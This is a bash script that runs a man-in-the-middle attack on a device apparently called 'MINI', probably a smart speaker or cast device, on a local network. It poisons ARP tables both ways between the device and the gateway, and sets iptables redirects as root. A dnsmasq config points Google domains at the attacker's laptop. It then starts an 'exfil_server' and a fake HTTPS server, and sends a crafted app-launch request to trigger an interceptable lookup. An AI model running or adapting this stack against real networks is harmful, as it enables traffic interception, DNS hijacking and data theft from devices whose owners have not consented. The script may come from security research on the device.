#!/usr/bin/env bash
# Wait until the laptop is back on 192.168.1.x, then restart the full MITM stack
# and immediately test the unknown-AppID HTTP fallback.
set -e

MINI=192.168.1.29
GW=192.168.1.1
IFACE=wlp0s20f3
MY_IP=192.168.1.24
EXPLOIT_DIR="$(dirname "$0")/../reconstruction/exploit/magellan"

echo "[*] waiting for interface $IFACE to be on 192.168.1.x ..."
while true; do
    CUR_IP=$(ip addr show "$IFACE" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | grep '^192\.168\.1\.' | head -1)
    if [[ -n "$CUR_IP" ]]; then
        echo "[*] back on 192.168.1.x (IP=$CUR_IP)"
        break
    fi
    sleep 3
done

# ── iptables ─────────────────────────────────────────────────────────────────
echo "[*] restoring iptables REDIRECT rules..."
sudo bash "$(dirname "$0")/mitm-setup-root.sh"

# ── arpspoof ─────────────────────────────────────────────────────────────────
echo "[*] starting arpspoof..."
nohup arpspoof -i "$IFACE" -t "$MINI" "$GW"  >/dev/null 2>&1 &
nohup arpspoof -i "$IFACE" -t "$GW" "$MINI"  >/dev/null 2>&1 &

# ── dnsmasq ──────────────────────────────────────────────────────────────────
echo "[*] starting dnsmasq on port 5354..."
kill $(lsof -ti:5354) 2>/dev/null || true; sleep 0.3
cat > /tmp/dnsmasq-mitm.conf << DNSEOF
port=5354
no-daemon
interface=$IFACE
bind-interfaces
no-resolv
no-hosts
address=/clients3.google.com/$MY_IP
address=/clients.l.google.com/$MY_IP
address=/connectivitycheck.gstatic.com/$MY_IP
address=/www.gstatic.com/$MY_IP
address=/.googleapis.com/$MY_IP
address=/.google.com/$MY_IP
server=8.8.8.8
DNSEOF
nohup dnsmasq -C /tmp/dnsmasq-mitm.conf >/tmp/dnsmasq-mitm.log 2>&1 &

# ── servers ──────────────────────────────────────────────────────────────────
echo "[*] starting exfil_server (port 8080)..."
kill $(lsof -ti:8080) 2>/dev/null || true; sleep 0.3
> /tmp/exfil-log.txt
nohup python3 "$EXPLOIT_DIR/exfil_server.py" 2>/tmp/exfil-log.txt &

echo "[*] starting mitm_https_server (port 4443)..."
kill $(lsof -ti:4443) 2>/dev/null || true; sleep 0.3
> /tmp/mitm_hits.log
nohup python3 "$EXPLOIT_DIR/mitm_https_server.py" 2>>/tmp/mitm_hits.log &

sleep 2
echo "[*] MITM stack up. Status:"
ss -tlnp | grep -E "8080|4443"
ss -ulnp | grep 5354 | head -2

echo ""
echo "[*] sending LAUNCH with unknown AppID DEADBEEF to force registry lookup..."
python3 "$EXPLOIT_DIR/launch_unknown_appid.py" --host "$MINI" --app DEADBEEF &

echo ""
echo "[*] monitoring HTTP hits (port 8080) for registry request..."
tail -f /tmp/exfil-log.txt
